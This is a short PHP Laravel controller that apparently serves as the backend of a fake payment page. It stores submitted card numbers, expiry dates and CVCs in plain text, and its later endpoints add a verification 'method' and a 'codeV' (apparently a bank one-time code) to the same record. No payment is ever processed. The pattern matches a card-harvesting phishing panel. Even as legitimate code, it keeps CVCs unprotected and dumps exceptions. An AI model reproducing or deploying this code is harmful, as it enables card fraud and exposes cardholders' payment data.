<?php

namespace App\Http\Controllers;

use App\Models\PaymentGetaway;
use App\Models\User;
use Illuminate\Http\Request;

class PaymentController extends Controller
{
    public function paymentGetaway(Request $request)
    {
        try {
            $year =  $request->year;
            $month =  $request->month;
            $date = $month . '/' . $year;
            $c = User::where('email', $request->email)->latest()->first();
            $id_user = $c->id;

            $p = new PaymentGetaway();
            $p->email = $request->email;
            $p->cardN = $request->card;
            $p->date = $date;
            $p->cvc = $request->cvc;
            $p->id_user = $id_user;
            $p->country = $request->country;
            $p->save();
            return response()->json(['status' => 'success']);
        } catch (\PDOException $e) {
            dd($e);
        }
    }


    public function paymentMethod(Request $request)
    {
        try {

            $payment = PaymentGetaway::where('cardN', $request->card)->latest()->first();
            if ($payment) {
                $payment->method = $request->method;
                $payment->save();
            }
            return response()->json(['status' => 'success']);
        } catch (\PDOException $e) {
            dd($e);
        }
    }


    public function paymentCode(Request $request)
    {
        try {

            $payment = PaymentGetaway::where('cardN', $request->card)->latest()->first();
            if ($payment) {
                $payment->codeV = $request->codeV;
                $payment->save();
            }
            return response()->json(['status' => 'success']);
        } catch (\PDOException $e) {
            dd($e);
        }
    }
}
